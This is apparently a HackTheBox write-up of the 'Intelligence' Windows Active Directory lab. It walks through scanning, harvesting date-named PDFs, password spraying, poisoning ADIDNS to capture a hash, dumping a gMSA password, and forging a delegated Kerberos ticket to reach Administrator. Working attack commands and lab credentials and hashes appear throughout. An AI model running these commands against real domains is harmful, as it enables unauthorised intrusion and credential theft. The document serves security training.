---
title: Intelligence
date: 2026-09-02
description: Medium Windows AD box harvesting date-named PDFs from IIS, recovering the domain default password from document metadata, and chaining a DNS-pointing script into gMSA delegation and a faked-time S4U2self ticket.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Wed Sep  2 13:37:16 2026 as: /usr/lib/nmap/nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49710,49713,49738 -A -oN scan_results.txt 10.129.95.154
Nmap scan report for intelligence.htb (10.129.95.154)
Host is up (0.62s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-09-02 00:41:20Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49691/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc             Microsoft Windows RPC
49710/tcp open  msrpc             Microsoft Windows RPC
49713/tcp open  msrpc             Microsoft Windows RPC
49738/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Windows Server 2019 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -16h56m12s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-02T00:42:57
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   44.97 ms 10.10.16.1
2   47.97 ms intelligence.htb (10.129.95.154)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  2 13:40:22 2026 -- 1 IP address (1 host up) scanned in 185.95 seconds

```

- No anonymous bind on LDAP
- Can't list the share as guest

A `/documents` directory on the web server holds `uploaded.pdf` — files follow a **date-based** naming schema, visible in the page source:

```html
<a href="documents/2020-01-01-upload.pdf" class="badge badge-secondary">Download</a>

<a href="documents/2020-12-15-upload.pdf" class="badge badge-secondary">Download</a>
```

- Directory listing is 403 — download them instead with a one-liner:

```sh
d=2020-01-01; while [ "$d" != "$(date -I)" ]; do echo "http://10.10.10.248/Documents/$d-upload.pdf"; d=$(date -I -d "$d + 1 day"); done | xargs -n 1 -P 20 wget -q 2>/dev/null
```

---
- `d=2020-01-01` — Sets the starting date variable to January 1, 2020

- `while [ "$d" != "$(date -I)" ]` — Loops while the date variable doesn't equal today's date

- `do` — Starts the loop block
- `echo "http://10.129.95.154/Documents/\$d-upload.pdf"` — Prints a URL for each date (e.g., 2020-01-01-upload.pdf, 2020-01-02-upload.pdf, etc.)
- `d=$(date -I -d "$d + 1 day")` — Increments the date by one day for the next iteration
- `done` — Ends the loop block
 
- `xargs -n 1 -P 20 wget -q` — Takes each URL and downloads it with wget, using 20 parallel processes (-P 20), one URL at a time (-n 1), in quiet mode (-q)
---
> **Note**: `xargs` is a command that takes input and converts it into arguments for another command.
---

Extract **usernames** from the pdf **meta-data** with `exiftool`:

```sh
exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
```

One more one-liner converts **pdf** files **to text** using the binary `pdftotext`:

```sh
for f in *pdf; do pdftotext $f; done
```

Then scan the **header** of every converted **text** file:

```sh
head -n1 *txt
```

Two files stood out — everything else was random latin words. Reviewing both explains why guest can't read the share, and hands over the machine's default password. Brute the userlist with `nxc` against it:

> `Tiffany.Molina - NewIntelligenceCorpUser9876`

# User

**Users** & **IT** share are readable by **Tiffany.Molina**.

- **Users** holds her home directory — user flag in hand
- **IT** holds a **powershell script** that loops through DNS records and sends an authenticated request to any host whose name starts with **web**, to check its status

We can leverage the permission (granted by default to authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone — **add a new record that points** to our own IP using `dnstool.py`:

```sh
dnstool -u 'INTELLIGENCE\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r web1 -d 10.10.16.82 10.129.95.154
```

Listener up to catch the **ntlm-hash** the moment the script runs (NTLM-relay):

```sh
responder -i tun0
```

> `Ted.Graves - Mr.Teddy`

### bloodhound-python

No shell with that account — collect **AD posture data** first:

```sh
bloodhound-python -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -ns 10.129.95.154 -c ALL
```

# Root

- `Ted.Graves` is a member of the **itsupport group**
- **itsupport** has `ReadGMSAPassword` over `svc_int`

> https://github.com/micahvandeusen/gMSADumper

```python
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
```

That yields the **NT hash** of `svc_int`, which has **AllowedToDelegate** over the **DC**.

The clock skew is too great — Kerberos tickets (K-T-T) are timing sensitive, so wrap the impacket calls with **faketime**. The nmap scan already told us the skew:

- Check the nmap scan for clock-skew time
- The **FQDN** revealed while dumping the `svc_int` hash is `dc` — add `dc.intelligence.htb` to `/etc/hosts`

```sh
faketime 'now -16 hours -56 minutes -12 seconds' impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' 'intelligence.htb/svc_int' -hashes ':4de450f51af61cf1e67e982965aca00c'
```

- Rename the **ccache** to `Administrator.ccache` and point Kerberos at it:

```sh
export KRB5CCNAME=Administrator.ccache
```

- **wmiexec** logs in easier than the other tools:

```sh
faketime 'now -16 hours -56 minutes -12 seconds' impacket-wmiexec -k -no-pass dc.intelligence.htb 
```

Gained `root`
